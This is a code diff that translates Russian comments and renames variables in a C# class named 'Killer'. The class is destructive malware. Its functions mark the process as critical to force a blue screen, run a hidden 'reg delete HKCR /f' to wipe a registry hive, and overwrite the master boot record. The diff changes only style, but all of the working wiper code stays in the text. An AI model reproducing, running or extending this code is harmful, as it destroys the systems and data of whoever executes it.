@@ -6,7 +6,7 @@ namespace Crock
 {
     class Killer
     {
-        // Регистрация DLL
+        // Registration DLL
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass,
             ref int processInformation, int processInformationLength);
@@ -63,24 +63,24 @@ namespace Crock
             WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
         }
 
-        // Вызов синего экрана
+        // BSOD call
         public static void BSOD()
         {
-            int isCritical = 1;
-            int BreakOnTermination = 0x1D;
+            var isCritical = 1;
+            const int breakOnTermination = 0x1D;
 
             Process.EnterDebugMode();
-            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, breakOnTermination, ref isCritical, sizeof(int));
         }
 
-        // Удоление риестра
+        // Registry removal
         public static void RegFuck()
         {
-            ProcessStartInfo reg_kill = new ProcessStartInfo();
-            reg_kill.FileName = "cmd.exe";
-            reg_kill.WindowStyle = ProcessWindowStyle.Hidden;
-            reg_kill.Arguments = @"/k reg delete HKCR /f";
-            Process.Start(reg_kill);
+            var regKill = new ProcessStartInfo();
+            regKill.FileName = "cmd.exe";
+            regKill.WindowStyle = ProcessWindowStyle.Hidden;
+            regKill.Arguments = @"/k reg delete HKCR /f";
+            Process.Start(regKill);
         }
     }
 }
